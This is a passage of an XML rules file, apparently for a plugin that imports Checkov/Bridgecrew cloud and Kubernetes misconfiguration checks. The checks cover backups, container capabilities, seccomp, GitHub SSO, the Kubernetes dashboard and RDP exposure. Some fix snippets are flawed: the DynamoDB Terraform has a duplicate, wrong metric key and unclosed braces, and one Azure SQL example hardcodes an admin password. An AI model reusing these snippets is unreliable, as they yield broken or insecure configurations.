  name                  = "${var.prefix}-vm"
  location              = azurerm_resource_group.main.location
  resource_group_name   = azurerm_resource_group.main.name
  network_interface_ids = [azurerm_network_interface.main.id]
  vm_size               = "Standard_DS1_v2"
}

resource "azurerm_backup_protected_vm" "vm_protected_backup" {
  resource_group_name = azurerm_resource_group.example_ok.name
  recovery_vault_name = azurerm_recovery_services_vault.example_ok.name
  source_vm_id        = azurerm_virtual_machine.example_ok.id
  backup_policy_id    = azurerm_backup_policy_vm.example_ok.id
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-virtual-machines-are-backed-up-using-azure-backup' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-virtual-machines-are-backed-up-using-azure-backup</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-virtual-machines-are-backed-up-using-azure-backup' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_28</key>
    <name>Ensure admission of containers with NET_RAW capability is minimized</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="admission-of-containers-with-net_raw-capability-is-not-minimized"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-admission-of-containers-with-net-raw-capability-is-not-minimized"></div>Admission of containers with NET_RAW capability is not minimized</div><a aria-label="Skip link to Admission of containers with NET_RAW capability is not minimized" class="heading-anchor-icon fa fa-anchor" href="#admission-of-containers-with-net_raw-capability-is-not-minimized"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>NET_RAW capability allows the binary to use RAW and PACKET sockets as well as binding to any address for transparent proxying. The <em>ep</em> stands for &#8220;effective&#8221; (active) and &#8220;permitted&#8221; (allowed to be used). </p>
<p>With Docker as the container runtime NET_RAW capability is enabled by default and may be misused by malicious containers. We recommend you define at least one PodSecurityPolicy (PSP) to prevent containers with NET_RAW capability from launching.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Argument</strong>: securityContext:capabilities:drop (Optional)<br/>
Capabilites field allows granting certain privileges to a process without granting all the privileges of the root user. when <strong>drop</strong> includes <strong>ALL</strong> or <strong>NET_RAW</strong>, the <strong>NET_RAW</strong> capability is disabled.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;Pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    securityContext:
      capabilities:
        drop:
+        - NET_RAW
+        - ALL
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_27' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_27</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_27' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITHUB_2</key>
    <name>Ensure GitHub organization security settings require SSO</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-organization-security-settings-do-not-include-sso"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-organization-security-settings-do-not-include-sso"></div>GitHub organization security settings do not include SSO</div><a aria-label="Skip link to GitHub organization security settings do not include SSO" class="heading-anchor-icon fa fa-anchor" href="#github-organization-security-settings-do-not-include-sso"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Organization owners and admins can enforce SAML SSO so that all organization members must authenticate via an identity provider (IdP). You can also enforce SAML SSO for your organization. When you enforce SAML SSO, all members of the organization must authenticate through your IdP to access the organization's resources. Enforcement removes any members and administrators who have not authenticated via your IdP from the organization. GitHub sends an email notification to each removed user.</p>
<p>Enforce SAML SSO for your organization</p>
<ol>
<li>
<p>Enable and test SAML SSO for your organization, then authenticate with your IdP at least once. For more information, see "Enabling and testing SAML single sign-on for your organization."</p>
</li>
<li>
<p>Prepare to enforce SAML SSO for your organization. For more information, see "Preparing to enforce SAML single sign-on in your organization."</p>
</li>
<li>
<p>In the top right corner of GitHub.com, click your profile photo, then click Your organizations.<br/>
Your organizations in the profile menu</p>
</li>
<li>
<p>Next to the organization, click Settings.<br/>
The settings button</p>
</li>
<li>
<p>In the "Security" section of the sidebar, click  Authentication security.</p>
</li>
<li>
<p>Under "SAML single sign-on", select Require SAML SSO authentication for all members of the ORGANIZATION organization.<br/>
"Require SAML SSO authentication" checkbox</p>
</li>
<li>
<p>Under "Single sign-on recovery codes", review your recovery codes. Store the recovery codes in a safe location like a password manager.</p>
</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-github-organization-security-settings-require-sso' target='_blank'> https://docs.bridgecrew.io/docs/ensure-github-organization-security-settings-require-sso</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-github-organization-security-settings-require-sso' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITHUB_5</key>
    <name>Ensure GitHub pull requests have at least 2 approvals</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-pull-requests-have-less-than-approvals"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-pull-requests-have-less-than-approvals"></div>GitHub pull requests have less than approvals</div><a aria-label="Skip link to GitHub pull requests have less than approvals" class="heading-anchor-icon fa fa-anchor" href="#github-pull-requests-have-less-than-approvals"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In GitHub, repository administrators can require that all pull requests receive a specific number of approving reviews before someone merges the pull request into a protected branch. It is also possible to require approving reviews from people with write permissions in the repository or from a designated code owner.</p>
<p>If a collaborator attempts to merge a pull request with pending or rejected reviews into the protected branch, the collaborator will receive an error message.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: github_branch_protection, github_branch_protection_v3</li>
<li>Attribute: required_approving_review_count</li>
</ul>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-HCL theme-light" data-lang="HCL" name="">resource "github_branch_protection_v3" "example" {
...  
  required_pull_request_reviews {
+    required_approving_review_count = 2
...
  }
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/merge-requests-should-require-at-least-2-approvals' target='_blank'> https://docs.bridgecrew.io/docs/merge-requests-should-require-at-least-2-approvals</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/merge-requests-should-require-at-least-2-approvals' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_30</key>
    <name>Ensure securityContext is applied to pods and containers</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="securitycontext-is-not-applied-to-pods-and-containers"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-security-context-is-not-applied-to-pods-and-containers"></div>securityContext is not applied to pods and containers</div><a aria-label="Skip link to securityContext is not applied to pods and containers" class="heading-anchor-icon fa fa-anchor" href="#securitycontext-is-not-applied-to-pods-and-containers"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p><strong>securityContext</strong> defines privilege and access control settings for your pod or container, and holds security configurations that will be applied to a container. Some fields are present in both <strong>securityContext</strong> and <strong>PodSecurityContext</strong>,  when both are set, <strong>securityContext</strong> takes precedence. </p>
<p>Well-defined privilege and access control settings will enhance assurance that your pod is running with the properties it requires to function.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>:  Container / Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob</li>
<li><strong>Argument</strong>: securityContext (Optional)<br/>
A field that defines privilege and access control settings for your Pod or Container.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Container</button><button type="button">Pod</button><button type="button">CronJob</button><button type="button">Other</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Container">apiVersion: v1
kind: Pod
metadata:
  name: &lt;Pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
+   securityContext:
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Pod">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
+  securityContext:
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="CronJob">apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: &lt;name&gt;
spec:
  schedule: &lt;&gt;
  jobTemplate:
    spec:
      template:
        spec:
+          securityContext:
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Other">apiVersion: &lt;&gt;
kind: &lt;kind&gt;
metadata:
  name: &lt;name&gt;
spec:
  template:
    spec:
+       securityContext:
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_28' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_28</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_28' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_31</key>
    <name>Ensure seccomp is set to Docker/Default or Runtime/Default</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="seccomp-is-not-set-to-dockerdefault-or-runtimedefault"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-seccomp-is-not-set-to-docker-default-or-runtime-default"></div>seccomp is not set to Docker/Default or Runtime/Default</div><a aria-label="Skip link to seccomp is not set to Docker/Default or Runtime/Default" class="heading-anchor-icon fa fa-anchor" href="#seccomp-is-not-set-to-dockerdefault-or-runtimedefault"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Secure computing mode (seccomp) is a Linux kernel feature used to restrict actions available within the container. The seccomp() system call operates on the seccomp state of the calling process. The default seccomp profile provides a reliable setting for running containers with seccomp and disables non-essential system calls.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob</li>
<li><strong>Argument</strong>: securityContext: seccompProfile: type: (Optional: Kubernetes &gt; v1.19)<br/>
Addition of seccompProfile type: RuntimeDefault or DockerDefault </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Pod</button><button type="button">CronJob</button><button type="button">Other</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Pod">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
  securityContext:
+    seccompProfile:
+      type: RuntimeDefault
       or
+      type: DockerDefault
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="CronJob">apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: &lt;name&gt;
spec:
  schedule: &lt;&gt;
  jobTemplate:
    spec:
      template:
        spec:
          securityContext:
+            seccompProfile:
+              type: RuntimeDefault
               or
+              type: DockerDefault
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Other">apiVersion: &lt;&gt;
kind: &lt;kind&gt;
metadata:
  name: &lt;name&gt;
spec:
  template:
    spec:
      securityContext:
+        seccompProfile:
+          type: RuntimeDefault
           or
+          type: DockerDefault
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_29' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_29</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_29' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_4</key>
    <name>Ensure Azure SQL server ADS VA Send scan reports to is configured</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-sql-server-ads-va-send-scan-reports-to-is-not-configured"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-sql-server-ads-va-send-scan-reports-to-is-not-configured"></div>Azure SQL server ADS VA <strong>Send scan reports to</strong> is not configured</div><a aria-label="Skip link to Azure SQL server ADS VA " class="heading-anchor-icon fa fa-anchor" href="#azure-sql-server-ads-va-send-scan-reports-to-is-not-configured"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Configure 'Send scan reports to' with email ids of concerned data owners/stakeholders for a critical SQL servers.<br/>
Vulnerability Assessment (VA) scan reports and alerts will be sent to email ids configured at <strong>Send scan reports to</strong>. This may help in reducing time required for identifying risks and taking corrective measures.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_resource_group, azurerm_sql_server, azurerm_storage_account, azurerm_storage_container, azurerm_mssql_server_security_alert_policy, azurerm_mssql_server_vulnerability_assessment</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "okExample" {
  name     = "okExample-resources"
  location = "West Europe"
}

resource "azurerm_sql_server" "okExample" {
  name                         = "mysqlserver"
  resource_group_name          = azurerm_resource_group.okExample.name
  location                     = azurerm_resource_group.okExample.location
  version                      = "12.0"
  administrator_login          = "4dm1n157r470r"
  administrator_login_password = "4-v3ry-53cr37-p455w0rd"
}

resource "azurerm_storage_account" "okExample" {
  name                     = "accteststorageaccount"
  resource_group_name      = azurerm_resource_group.okExample.name
  location                 = azurerm_resource_group.okExample.location
  account_tier             = "Standard"
  account_replication_type = "GRS"
}

resource "azurerm_storage_container" "okExample" {
  name                  = "accteststoragecontainer"
  storage_account_name  = azurerm_storage_account.okExample.name
  container_access_type = "private"
}

resource "azurerm_mssql_server_security_alert_policy" "okExample" {
  resource_group_name = azurerm_resource_group.okExample.name
  server_name         = azurerm_sql_server.okExample.name
  state               = "Enabled"
}

resource "azurerm_mssql_server_vulnerability_assessment" "okExample" {
  server_security_alert_policy_id = azurerm_mssql_server_security_alert_policy.okExample.id
  storage_container_path          = "${azurerm_storage_account.okExample.primary_blob_endpoint}${azurerm_storage_container.okExample.name}/"
  storage_account_access_key      = azurerm_storage_account.okExample.primary_access_key

  recurring_scans {
    enabled                   = true
    email_subscription_admins = true
    emails = [
      "<a class="__cf_email__" data-cfemail="c9aca4a8a0a589acb1a8a4b9a5acf8e7aaa6a4" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>",
      "<a class="__cf_email__" data-cfemail="5e3b333f37321e3b263f332e323b6c703d3133" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
    ]
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-va-setting-send-scan-reports-to-is-configured-for-a-sql-server' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-va-setting-send-scan-reports-to-is-configured-for-a-sql-server</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-va-setting-send-scan-reports-to-is-configured-for-a-sql-server' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_33</key>
    <name>Ensure Kubernetes dashboard is not deployed</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes-dashboard-is-deployed"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes-dashboard-is-deployed"></div>Kubernetes dashboard is deployed</div><a aria-label="Skip link to Kubernetes dashboard is deployed" class="heading-anchor-icon fa fa-anchor" href="#kubernetes-dashboard-is-deployed"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description </div><a aria-label="Skip link to Description " class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Terraform provider for Azure enables the capability to disable the Kubernetes dashboard on an AKS cluster. This is achieved by providing the Kubernetes dashboard as an AKS add-on, similar to the Azure Monitor, for containers integration, AKS virtual nodes, and the HTTP application routing.</p>
<p>In mid-2019 Tesla was hacked where their kube-dashboard was exposed to the internet. Hackers browsed around, found credentials, and deployed pods running bitcoin mining software. We recommend you disable the kube-dashboard if it's not needed, to prevent the need to manage its individual access interface and limit it as an attack vector.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Arguments</strong>:<br/>
labels:app / k8s-app - specifies the app label for the pod<br/>
image - defines the image used by the container</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="YAML">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
  labels:
-   app: kubernetes-dashboard
-   k8s-app: kubernetes-dashboard
spec:
  containers:
  - name: &lt;container name&gt;
-   image: kubernetes-dashboard
-   image: kubernetesui
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_31' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_31</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_31' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_16</key>
    <name>Ensure DynamoDB Tables have Auto Scaling enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="dynamodb-tables-do-not-have-auto-scaling-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-dynamo-db-tables-do-not-have-auto-scaling-enabled"></div>DynamoDB Tables do not have Auto Scaling enabled  </div><a aria-label="Skip link to DynamoDB Tables do not have Auto Scaling enabled  " class="heading-anchor-icon fa fa-anchor" href="#dynamodb-tables-do-not-have-auto-scaling-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Checks if DynamoDB tables have autoscaling configuration. Note that for tables with billing_mode = "PAY_PER_REQUEST" such configuration is embedded by default.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_appautoscaling_target, aws_appautoscaling_policy, aws_dynamodb_table</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_dynamodb_table" "pass" {
  name           = "user"
  hash_key       = "user-id"
  billing_mode   = "PROVISIONED"
  read_capacity  = 10
  write_capacity = 10
  attribute {
    name = "user-id"
    type = "S"
  }
}

resource "aws_appautoscaling_target" "pass" {
  resource_id        = "table/${aws_dynamodb_table.pass.name}"
  scalable_dimension = "dynamodb:table:ReadCapacityUnits"
  service_namespace  = "dynamodb"
  min_capacity       = 1
  max_capacity       = 15
}

resource "aws_appautoscaling_policy" "pass" {
  name               = "rcu-auto-scaling"
  service_namespace  = aws_appautoscaling_target.pass.service_namespace
  scalable_dimension = aws_appautoscaling_target.pass.scalable_dimension
  resource_id        = aws_appautoscaling_target.pass.resource_id
  policy_type        = "TargetTrackingScaling"

  target_tracking_scaling_policy_configuration {
    predefined_metric_specification {
      predefined_metric_type = "RDSReaderAverageCPUUtilization"
      predefined_metric_type = "DynamoDBReadCapacityUtilization"
    }

// or:
    
resource "aws_dynamodb_table" "pass_on_demand" {
  name           = "user"
  hash_key       = "user-id"
  billing_mode   = "PAY_PER_REQUEST"

  attribute {
    name = "user-id"
    type = "S"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-auto-scaling-is-enabled-on-your-dynamodb-tables' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-auto-scaling-is-enabled-on-your-dynamodb-tables</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-auto-scaling-is-enabled-on-your-dynamodb-tables' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_3</key>
    <name>Ensure no Alibaba Cloud security groups allow ingress from 0.0.0.0:0 to port 3389</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-security-group-allows-internet-traffic-to-rdp-port-3389"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-security-group-allows-internet-traffic-to-rdp-port-3389"></div>Alibaba Cloud Security group allows internet traffic to RDP port (3389)</div><a aria-label="Skip link to Alibaba Cloud Security group allows internet traffic to RDP port (3389)" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-security-group-allows-internet-traffic-to-rdp-port-3389"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Security groups that allow inbound traffic on RDP port (3389) from the public internet. As a best practice, restrict security groups to only allow permitted traffic and limit brute force attacks on your network.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-portal"></div>Alibaba Cloud Portal</div><a aria-label="Skip link to Alibaba Cloud Portal" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-portal"></a></h2>
<ol>
<li>Log in to Alibaba Cloud Portal</li>
<li>Go to Elastic Compute Service</li>
<li>In the left-side navigation pane, choose Network &amp; Security &gt; Security Groups</li>
<li>Select the reported security group and then click Add Rules in the Actions column</li>
